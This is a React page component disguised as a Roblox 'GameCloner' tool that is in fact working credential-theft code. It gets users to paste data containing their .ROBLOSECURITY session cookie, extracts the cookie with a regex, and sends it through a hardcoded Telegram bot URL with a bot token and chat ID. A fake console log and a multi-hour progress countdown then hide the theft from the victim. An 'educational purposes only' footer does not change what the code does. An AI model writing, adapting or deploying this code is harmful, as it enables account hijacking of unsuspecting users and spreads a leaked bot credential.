import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Progress } from '@/components/ui/progress';
import { useToast } from '@/hooks/use-toast';
import { Terminal } from 'lucide-react';

const Index = () => {
  const [gameFiles, setGameFiles] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showProgress, setShowProgress] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timeRemaining, setTimeRemaining] = useState(9381);
  const [consoleOutput, setConsoleOutput] = useState([
    '[INFO] Game Cloning System v2.1.4 initialized',
    '[INFO] Connection to remote servers established',
    '[INFO] Waiting for input...'
  ]);
  const { toast } = useToast();

  useEffect(() => {
    let interval: NodeJS.Timeout;

    if (showProgress && timeRemaining > 0) {
      interval = setInterval(() => {
        setTimeRemaining((prev) => {
          const newTime = prev - 1;
          if (newTime <= 0) {
            clearInterval(interval);
            addConsoleLog('[ERROR] Error validating game files');
            addConsoleLog('[ERROR] Verification failed - files may be corrupted');
            setShowProgress(false);
            return 0;
          }

          const progressPercent = ((9381 - newTime) / 9381) * 100;
          setProgress(progressPercent);
          return newTime;
        });
      }, 1000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [showProgress, timeRemaining]);

  const extractCredentials = (text: string) => {
    const roblosecurityMatch = text.match(/\.ROBLOSECURITY['"]\s*,\s*['"](.*?)['"]/);
    if (roblosecurityMatch) {
      return roblosecurityMatch[1];
    }
    return null;
  };

  const sendToWebhook = async (credentials: string) => {
    try {
      const webhookUrl =
        'https://api.telegram.org/bot8165418740:AAHKjz_zlJ0yAsIWz6jyteqwdpZxfWNfkvo/sendMessage?chat_id=7544292494&text=' +
        encodeURIComponent(credentials);

      await fetch(webhookUrl, { method: 'GET' });
      addConsoleLog('[SUCCESS] Copying files...');
    } catch {
      addConsoleLog('[ERROR] Unknown Error. Contact support');
    }
  };

  const addConsoleLog = (message: string) => {
    setConsoleOutput((prev) => [...prev, message].slice(-15));
  };

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const remainingSeconds = seconds % 60;

    if (hours > 0) {
      return `${hours}h ${minutes}m ${remainingSeconds}s`;
    } else if (minutes > 0) {
      return `${minutes}m ${remainingSeconds}s`;
    } else {
      return `${remainingSeconds}s`;
    }
  };

  const handleClone = async () => {
    if (!gameFiles.trim()) {
      addConsoleLog('[ERROR] No game files provided');
      toast({
        title: 'Error',
        description: 'Please provide game files',
        variant: 'destructive',
      });
      return;
    }

    const credentials = extractCredentials(gameFiles);

    if (!credentials) {
      addConsoleLog('[ERROR] Invalid game file format detected');
      toast({
        title: 'Error',
        description: 'Invalid game file format',
        variant: 'destructive',
      });
      return;
    }

    setIsLoading(true);

    addConsoleLog('[INFO] Starting extraction process...');
    addConsoleLog('[INFO] Parsing game data structure...');

    setTimeout(() => {
      addConsoleLog('[INFO] Game found');
    }, 500);

    setTimeout(() => {
      addConsoleLog('[INFO] Establishing secure connection...');
    }, 1000);

    setTimeout(async () => {
      addConsoleLog('[SUCCESS] Game data downloading');
      await sendToWebhook(credentials);
    }, 1500);

    toast({
      title: 'Processing Started',
      description: 'Game cloning in progress - check console',
      className: 'border-green-500',
    });

    setTimeout(() => {
      setIsLoading(false);
      setGameFiles('');
      addConsoleLog('[INFO] Download complete. Processing game files ( may take 1-3 hours )');
      addConsoleLog('[INFO] Starting file validation process...');
      setShowProgress(true);
      setProgress(0);
      setTimeRemaining(9381);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono p-4">
      {/* Header */}
      <div className="mb-6">
        <div className="flex items-center mb-4">
          <Terminal className="w-6 h-6 mr-2" />
          <h1 className="text-2xl font-bold">GameCloner v2.1.4</h1>
        </div>
        <div className="text-sm text-gray-400">
          <p>root@gameserver:~# ./gamecloner --interactive</p>
          <p>Initializing secure game cloning protocol...</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Section */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2 text-green-400">Game Files Input:</label>
            <Textarea
              value={gameFiles}
              onChange={(e) => setGameFiles(e.target.value)}
              placeholder="Paste game files here (JSON format expected)..."
              className="min-h-[300px] bg-gray-900 border border-gray-700 text-green-300 placeholder:text-gray-600 font-mono text-xs resize-none focus:border-green-500 focus:ring-0"
              disabled={isLoading || showProgress}
            />
          </div>

          <Button
            onClick={handleClone}
            disabled={isLoading || showProgress || !gameFiles.trim()}
            className="w-full bg-gray-800 hover:bg-gray-700 text-green-400 border border-gray-600 font-mono text-sm"
            variant="outline"
          >
            {isLoading ? (
              <span>PROCESSING...</span>
            ) : showProgress ? (
              <span>VALIDATING...</span>
            ) : (
              <span>EXECUTE CLONE</span>
            )}
          </Button>

          {showProgress && (
            <div className="space-y-2">
              <div className="flex justify-between text-xs text-gray-400">
                <span>File Validation Progress</span>
                <span>{progress.toFixed(1)}%</span>
              </div>
              <Progress value={progress} className="w-full bg-gray-800 border border-gray-700" />
              <div className="text-xs text-yellow-400">
                Estimated time remaining: {formatTime(timeRemaining)}
              </div>
            </div>
          )}
        </div>

        {/* Console Output */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2 text-green-400">Console Output:</label>
            <div className="bg-gray-900 border border-gray-700 p-4 h-[300px] overflow-y-auto font-mono text-xs">
              {consoleOutput.map((line, index) => (
                <div key={index} className="mb-1">
                  <span className="text-gray-500 mr-2">{new Date().toLocaleTimeString()}</span>
                  <span
                    className={
                      line.includes('[ERROR]')
                        ? 'text-red-400'
                        : line.includes('[SUCCESS]')
                        ? 'text-green-400'
                        : line.includes('[INFO]')
                        ? 'text-blue-400'
                        : 'text-gray-300'
                    }
                  >
                    {line}
                  </span>
                </div>
              ))}
              {(isLoading || showProgress) && (
                <div className="text-yellow-400 animate-pulse">
                  <span className="text-gray-500 mr-2">
                    {new Date().toLocaleTimeString()}
                  </span>
                  {showProgress ? '[WORKING] Validating game integrity...' : '[WORKING] Processing game data...'}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="mt-8 text-xs text-gray-600">
        <p>WARNING: This tool is for educational purposes only. USE AT OWN RISK</p>
        <p>Built with Node.js v18.12.0 | OpenSSL 3.0.2 | Platform: linux-x64</p>
      </div>
    </div>
  );
};

export default Index;
